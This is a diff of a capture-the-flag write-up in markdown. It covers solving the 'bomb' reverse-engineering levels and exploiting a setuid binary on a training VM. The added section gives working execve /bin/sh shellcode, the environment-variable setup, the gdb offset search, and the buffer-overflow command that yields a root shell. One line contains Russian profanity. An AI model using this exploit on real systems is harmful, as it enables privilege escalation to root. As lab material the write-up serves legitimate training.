@@ -68,25 +68,125 @@ But it doesnt work for 2nd level. OK, we download radare2, and here we go.
 We have two simple functions. First, we read six numbers from stdin. If numbers count not equal six, we exlode bomb.
 Simply run debugger and watch at cmp instruction. At the end we have 1 2 6 24 120 720
 
-![l2_read_six_nums](bomb/l2_read_six_nums.png)
+![l2_read_six_nums](screenshots/bomb/l2_read_six_nums.png)
 
 3d level.
 Func want t numbers and letter. OKAY. It is only begin. We see a lot of jumps fahrer from begin. There is switch-case construction.
 It depend from first number value. So we try everything from first condition and we're good.
 In the HINT our letter is b, so second group of values is ours. 1 b 214. OK
 
-![l3_beginning](bomb/l3_beginning.png)
-![l3_general](bomb/l3_general.png)
+![l3_beginning](screenshots/bomb/l3_beginning.png)
+![l3_general](screenshots/bomb/l3_general.png)
 
-4d level.
+4th level.
 Owh. We're bad. We have recoursive function here. It will be hard. 
 We have internet, so we can install ghydra with 'r2pm --ci r2ghydra'.
 Я не смог установить гидру и там пищдец, меня это заебало внатуре ахахах
 
+5th level.
+Given setuid binary exploit_me. Lets disassemble it:
 
+    (gdb) set disassembly-flavor intel
+    (gdb) disass main
+    Dump of assembler code for function main:
+    0x080483f4 <+0>:	push   ebp
+    0x080483f5 <+1>:	mov    ebp,esp
+    0x080483f7 <+3>:	and    esp,0xfffffff0
+    0x080483fa <+6>:	sub    esp,0x90
+    0x08048400 <+12>:	cmp    DWORD PTR [ebp+0x8],0x1
+    0x08048404 <+16>:	jg     0x804840d <main+25>
+    0x08048406 <+18>:	mov    eax,0x1
+    0x0804840b <+23>:	jmp    0x8048436 <main+66>
+    0x0804840d <+25>:	mov    eax,DWORD PTR [ebp+0xc]
+    0x08048410 <+28>:	add    eax,0x4
+    0x08048413 <+31>:	mov    eax,DWORD PTR [eax]
+    0x08048415 <+33>:	mov    DWORD PTR [esp+0x4],eax
+    0x08048419 <+37>:	lea    eax,[esp+0x10]
+    0x0804841d <+41>:	mov    DWORD PTR [esp],eax
+    0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
+    0x08048425 <+49>:	lea    eax,[esp+0x10]
+    0x08048429 <+53>:	mov    DWORD PTR [esp],eax
+    0x0804842c <+56>:	call   0x8048310 <puts@plt>
+    0x08048431 <+61>:	mov    eax,0x0
+    0x08048436 <+66>:	leave
+    0x08048437 <+67>:	ret
+    End of assembler dump.
 
+There is unprotected strcpy from command line arguments into buffer, we can abuse that by writing shellcode inside env variable and overwrite return eip address to point on this variable address.
+We can use this shellcode:
+
+    \x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
+
+Assembly of this shellcode will look like this:
+
+    xor    ebx,ebx
+    mov    eax,ebx
+    mov    al,0x17
+    int    0x80
+    xor    ebx,ebx
+    mov    eax,ebx
+    mov    al,0x2e
+    int    0x80
+    xor    eax,eax
+    push   eax
+    push   0x68732f2f
+    push   0x6e69622f
+    mov    ebx,esp
+    push   eax
+    push   ebx
+    mov    ecx,esp
+    xor    edx,edx
+    mov    al,0xb
+    int    0x80
+
+First we need to create shellcode env variable:
+
+    zaz@BornToSecHackMe:~$ export SHELLCODE=$(python -c 'print("\x90"*10+"\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80")')
+
+Next we need to find offset to eip and SHELLCODE env variable address:
+
+    zaz@BornToSecHackMe:~$ gdb ./exploit_me
+    (gdb) b *main+49
+    Breakpoint 1 at 0x8048425
+    (gdb) run aaaabbbbccccdddd
+    Starting program: /home/zaz/exploit_me aaaabbbbccccdddd
+
+    Breakpoint 1, 0x08048425 in main ()
+    (gdb) info frame
+    Stack level 0, frame at 0xbffff6d0:
+    eip = 0x8048425 in main; saved eip 0xb7e454d3
+    Arglist at 0xbffff6c8, args:
+    Locals at 0xbffff6c8, Previous frame's sp is 0xbffff6d0
+    Saved registers:
+    ebp at 0xbffff6c8, eip at 0xbffff6cc
+    (gdb) x/50x $sp
+    0xbffff630:	0xbffff640	0xbffff8ac	0x00000001	0xb7ec3c49
+    0xbffff640:	0x61616161	0x62626262	0x63636363	0x64646464
+    0xbffff650:	0xbffff700	0xb7fdd000	0x00000000	0xb7e5ec73
+    0xbffff660:	0x08048241	0x00000000	0x00c30000	0x00000001
+    0xbffff670:	0xbffff897	0x0000002f	0xbffff6cc	0xb7fd0ff4
+    0xbffff680:	0x08048440	0x080496e8	0x00000002	0x080482dd
+    0xbffff690:	0xb7fd13e4	0x00000016	0x080496e8	0x08048461
+    0xbffff6a0:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
+    0xbffff6b0:	0xb7fed280	0x00000000	0x08048449	0xb7fd0ff4
+    0xbffff6c0:	0x08048440	0x00000000	0x00000000	0xb7e454d3
+    0xbffff6d0:	0x00000002	0xbffff764	0xbffff770	0xb7fdc858
+    0xbffff6e0:	0x00000000	0xbffff71c	0xbffff770	0x00000000
+    0xbffff6f0:	0x0804820c	0xb7fd0ff4
+    (gdb) x/20s *((char**)environ)
+    0xbffff8bd:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\061ۉذ\027̀1ۉذ.̀1\300Ph//shh/bin\211\343PS\211\341\061Ұ\v̀"
+
+Shellcode address is 0xbffff8bd, offset from buffer to old eip is 140 bytes.
+Now we can perform our exploit:
+
+    zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print("a"*140 + "\xbd\xf8\xff\xbf")')
+    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa����
+    # whoami
+    root
+    #
 
 And in thor acc we have turtle and README. README doesn't tell anything usefull, so we look at file. It's text with directions of tutle. In Mother Russia we did this things it school.ON PAPER. And now We just write python script.
 
 ![turtle.dir](screenshots/turtle.png)
  
+
